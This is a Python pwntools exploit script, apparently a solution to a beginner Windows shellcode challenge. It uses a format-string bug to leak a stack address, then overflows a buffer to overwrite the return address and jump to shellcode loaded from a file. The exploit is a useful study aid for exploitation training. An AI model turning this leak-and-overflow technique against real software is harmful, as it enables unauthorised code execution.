from pwn import *

io = process(r".\Baby-windows-shellcode-level-1.exe")

input("Debugging")

shellcode = b""
with open("shellcode.bin", 'rb') as f:
    shellcode = f.read()

print("Len shellcode:", len(shellcode))

p = b"%p"*8
io.sendlineafter(b"name:", p)

io.recvuntil(b"Hello, ")
io.recvline()
leak = io.recvline().strip(b"\n\r")
leak = leak[-16:] # get the last 8 bytes
print("leak:", leak)
stack_leak = int(leak, 16)
print("Stack leak:", hex(stack_leak))

input_shellcode = stack_leak - 0xf8
print("Input shellcode:", hex(input_shellcode))


p = shellcode
pad = 0x100 - len(p)
p += b"A"*pad
p += b"B"*8 # rbp
p += p64(input_shellcode) # overwrite ret addr with start of our shellcode
p += b"\x90"*8

print("Len p:", len(p))

io.sendlineafter(b"> ", p)

io.interactive()